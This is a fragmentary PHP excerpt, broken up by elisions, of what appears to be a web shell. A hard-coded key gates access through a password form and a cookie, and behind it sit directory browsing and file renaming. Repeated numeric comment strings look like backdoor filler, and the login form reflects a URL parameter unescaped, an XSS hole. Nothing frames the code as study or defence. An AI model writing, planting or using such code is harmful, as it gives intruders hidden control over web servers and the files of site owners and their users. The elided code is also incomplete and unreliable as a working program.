...
$auth_key = "f43a4e8dafa79b618913ad52d9d350ae";
...
$pass = false;
if (isset($_COOKIE['pw_name_51087'])) {
    if(($_COOKIE['pw_name_51087']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_51087'])) {
        if(($_POST['pw_name_51087']) == $auth_key) {
            setcookie("pw_name_51087", $_POST['pw_name_51087']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_51087' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738600856860637 1738600856226016 1738600856148836 1738600856284806
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738600856860637 1738600856226016 1738600856148836 1738600856284806
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738600856860637 1738600856226016 1738600856148836 1738600856284806
            $name = PATH . "/" . $_GET['r'];
